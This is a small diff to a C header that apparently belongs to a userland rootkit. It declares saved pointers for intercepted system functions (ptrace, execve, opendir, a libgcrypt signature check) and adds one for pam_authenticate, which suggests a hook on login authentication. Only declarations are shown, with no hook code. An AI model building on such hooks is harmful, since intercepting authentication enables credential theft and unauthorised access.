@@ -13,6 +13,7 @@
 #include <sys/socket.h>
 #include <sys/ptrace.h>
 #include <netinet/in.h>
+#include <security/pam_appl.h>
 #include <arpa/inet.h>
 #include <dirent.h>
 #include <gcrypt.h>
@@ -54,6 +55,7 @@ extern FILE * (*o_fopen64)(const char *, const char *);
 extern DIR * (*o_opendir)(const char *);
 extern long (*o_ptrace)(enum __ptrace_request, pid_t, void *, void *);
 extern int (*o_execve)(const char *, char *const argv[], char *const envp[]);
+extern int (*o_pam_authenticate)(pam_handle_t *, int);
 extern gcry_error_t (*o_verify)(gcry_sexp_t, gcry_sexp_t, gcry_sexp_t);
 
 // functions hooks (interceptions)
